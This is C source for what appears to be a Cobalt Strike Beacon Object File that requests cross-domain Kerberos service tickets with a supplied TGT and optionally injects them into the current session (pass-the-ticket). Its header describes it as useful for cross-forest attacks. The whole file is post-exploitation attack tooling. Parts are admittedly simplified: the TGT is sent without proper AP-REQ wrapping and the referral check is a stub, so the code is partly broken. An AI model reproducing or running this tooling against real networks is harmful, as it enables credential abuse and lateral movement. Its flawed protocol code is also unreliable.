/*
 * krb_crossdomain - Request cross-domain/forest service tickets via referrals
 *
 * Requests service tickets for services in different domains by following
 * the Kerberos referral chain. Useful for cross-forest attacks.
 *
 * Usage: krb_crossdomain /ticket:BASE64 /service:SPN /targetdomain:DOMAIN [/dc:DC] [/ptt]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Additional declarations for ticket submission */
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

#define KerbSubmitTicketMessage 21
#define MAX_REFERRAL_HOPS 10

/* Submit ticket to current session */
static int submit_ticket(const BYTE* ticket_data, size_t ticket_len, formatp* output) {
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status, subStatus;
    PKERB_SUBMIT_TKT_REQUEST request = NULL;
    PVOID response = NULL;
    ULONG responseSize = 0;
    LSA_STRING kerbName;
    int result = 0;

    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] Failed to connect to LSA: 0x%08X\n", status);
        return 0;
    }

    kerbName.Buffer = "kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    size_t requestSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticket_len;
    request = (PKERB_SUBMIT_TKT_REQUEST)calloc(1, requestSize);
    if (!request) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    request->MessageType = KerbSubmitTicketMessage;
    request->KerbCredSize = (ULONG)ticket_len;
    request->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    memcpy((BYTE*)request + request->KerbCredOffset, ticket_data, ticket_len);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, request, (ULONG)requestSize,
        &response, &responseSize, &subStatus);

    if (status == 0 && subStatus == 0) {
        BeaconFormatPrintf(output, "[+] Ticket successfully imported into current session!\n");
        result = 1;
    } else {
        BeaconFormatPrintf(output, "[-] Failed to import ticket: status=0x%08X, substatus=0x%08X\n",
            status, subStatus);
    }

    if (response) SECUR32$LsaFreeReturnBuffer(response);
    free(request);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    return result;
}

/* Build TGS-REQ for cross-domain service */
static void build_crossdomain_tgs_req(KRB_BUFFER* out, const BYTE* tgt_data, size_t tgt_len,
                                       const char* source_domain, const char* target_domain,
                                       const char* spn) {
    KRB_BUFFER tgsreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER pa_tgs_req, ap_req;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&tgsreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 2048);
    buf_init(&req_body, 1024);
    buf_init(&pa_tgs_req, 2048);
    buf_init(&ap_req, 2048);
    buf_init(&body, 1024);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&tgsreq, 1, &pvno);

    /* Message type = TGS-REQ */
    asn1_encode_integer(&msg_type, KRB5_TGS_REQ);
    asn1_context_wrap(&tgsreq, 2, &msg_type);

    /* PA-DATA with TGT */
    /* The TGT should be wrapped in AP-REQ format */
    /* For simplicity, we include the raw ticket - this is a simplified version */
    {
        KRB_BUFFER pa_type, pa_data, pa_entry, pa_seq;
        buf_init(&pa_type, 16);
        buf_init(&pa_data, 2048);
        buf_init(&pa_entry, 2048);
        buf_init(&pa_seq, 2048);

        asn1_encode_integer(&pa_type, PADATA_TGS_REQ);
        asn1_context_wrap(&pa_entry, 1, &pa_type);

        /* Include TGT as pa-data value */
        asn1_encode_octet_string(&pa_data, tgt_data, tgt_len);
        asn1_context_wrap(&pa_entry, 2, &pa_data);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_entry);
        buf_append(&pa_seq, tmp.data, tmp.length);

        asn1_wrap(&padata, ASN1_SEQUENCE, &pa_seq);
        asn1_context_wrap(&tgsreq, 3, &padata);

        buf_free(&pa_type);
        buf_free(&pa_data);
        buf_free(&pa_entry);
        buf_free(&pa_seq);
    }
    buf_reset(&tmp);


    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Realm - target domain */
    asn1_encode_general_string(&tmp, target_domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal name (SPN) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 256);
        buf_init(&name_seq, 512);

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        /* Parse SPN into components (service/host) */
        char* spn_copy = (char*)malloc(strlen(spn) + 1);
        strcpy(spn_copy, spn);
        char* slash = strchr(spn_copy, '/');

        buf_reset(&tmp);
        if (slash) {
            *slash = '\0';
            asn1_encode_general_string(&tmp, spn_copy);
            asn1_encode_general_string(&tmp, slash + 1);
        } else {
            asn1_encode_general_string(&tmp, spn_copy);
        }
        free(spn_copy);

        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Supported encryption types */
    asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&tgsreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_TGS_REQ), &tgsreq);

    buf_free(&tgsreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&pa_tgs_req);
    buf_free(&ap_req);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Check if response is a referral */
static int is_referral_response(const BYTE* data, size_t len, char* referred_domain, size_t domain_size) {
    /* Look for cross-realm referral indicator in TGS-REP */
    /* Referrals have a server principal like krbtgt/TARGET_DOMAIN */
    (void)data;
    (void)len;
    (void)referred_domain;
    (void)domain_size;

    /* Simplified - would need full ASN.1 parsing to extract realm */
    return 0;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ticket_b64 = NULL;
    char* service = NULL;
    char* target_domain = NULL;
    char* dc = NULL;
    int do_ptt = 0;
    BYTE* ticket_data = NULL;
    size_t ticket_len = 0;
    WSADATA wsaData;

    BeaconFormatAlloc(&output, 8192);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Cross-Domain Service Ticket Request\n\n");


    ticket_b64 = arg_get(&parser, "ticket");
    service = arg_get(&parser, "service");
    target_domain = arg_get(&parser, "targetdomain");
    dc = arg_get(&parser, "dc");
    do_ptt = arg_exists(&parser, "ptt");

    if (!ticket_b64) {
        BeaconFormatPrintf(&output, "[-] Error: /ticket:BASE64 required (TGT for current domain)\n");
        goto cleanup;
    }

    if (!service) {
        BeaconFormatPrintf(&output, "[-] Error: /service:SPN required (target service principal)\n");
        goto cleanup;
    }

    if (!target_domain) {
        BeaconFormatPrintf(&output, "[-] Error: /targetdomain:DOMAIN required\n");
        goto cleanup;
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required (DC for current domain)\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Target Service: %s\n", service);
    BeaconFormatPrintf(&output, "[*] Target Domain: %s\n", target_domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    if (do_ptt) {
        BeaconFormatPrintf(&output, "[*] Will import ticket (PTT)\n");
    }
    BeaconFormatPrintf(&output, "\n");


    ticket_len = strlen(ticket_b64);
    ticket_data = (BYTE*)malloc(ticket_len);
    if (!ticket_data) {
        BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
        goto cleanup;
    }
    ticket_len = base64_decode(ticket_b64, strlen(ticket_b64), ticket_data);

    BeaconFormatPrintf(&output, "[*] TGT decoded: %zu bytes\n", ticket_len);


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        goto cleanup;
    }

    /* Follow referral chain */
    char current_domain[256];
    char* source_domain = get_domain_from_env();
    if (source_domain) {
        strcpy(current_domain, source_domain);
        free(source_domain);
    } else {
        strcpy(current_domain, "UNKNOWN");
    }

    BeaconFormatPrintf(&output, "[*] Source Domain: %s\n", current_domain);
    BeaconFormatPrintf(&output, "[*] Requesting cross-domain ticket via referral...\n\n");

    /* Build and send TGS-REQ */
    KRB_BUFFER request;
    buf_init(&request, 4096);
    build_crossdomain_tgs_req(&request, ticket_data, ticket_len, current_domain, target_domain, service);

    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC at %s:%d\n", dc, KRB5_PORT);
        buf_free(&request);
        goto cleanup_ws;
    }

    if (send_krb_msg(sock, request.data, request.length) > 0) {
        BYTE response[16384];
        int recv_len = recv_krb_msg(sock, response, sizeof(response));

        if (recv_len > 4) {
            BYTE* resp_data = response + 4;
            size_t resp_len = recv_len - 4;

            if (resp_data[0] == 0x6D) { /* TGS-REP */
                BeaconFormatPrintf(&output, "[+] Received TGS-REP (%zu bytes)\n", resp_len);

                /* Base64 encode response */
                char* ticket_out = (char*)malloc(resp_len * 2);
                if (ticket_out) {
                    base64_encode(resp_data, resp_len, ticket_out);
                    BeaconFormatPrintf(&output, "\n[*] Service Ticket (Base64):\n%s\n", ticket_out);

                    if (do_ptt) {
                        BeaconFormatPrintf(&output, "\n[*] Importing ticket...\n");
                        submit_ticket(resp_data, resp_len, &output);
                    }

                    free(ticket_out);
                }
            } else if (resp_data[0] == 0x7E) { /* KRB-ERROR */
                BeaconFormatPrintf(&output, "[-] Received KRB-ERROR\n");
                /* Could parse error for more details */
            } else {
                BeaconFormatPrintf(&output, "[?] Unexpected response type: 0x%02X\n", resp_data[0]);
            }
        }
    } else {
        BeaconFormatPrintf(&output, "[-] Failed to send request\n");
    }

    WS2_32$closesocket(sock);
    buf_free(&request);

cleanup_ws:
    WS2_32$WSACleanup();

cleanup:
    if (ticket_b64) free(ticket_b64);
    if (service) free(service);
    if (target_domain) free(target_domain);
    if (dc) free(dc);
    if (ticket_data) free(ticket_data);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
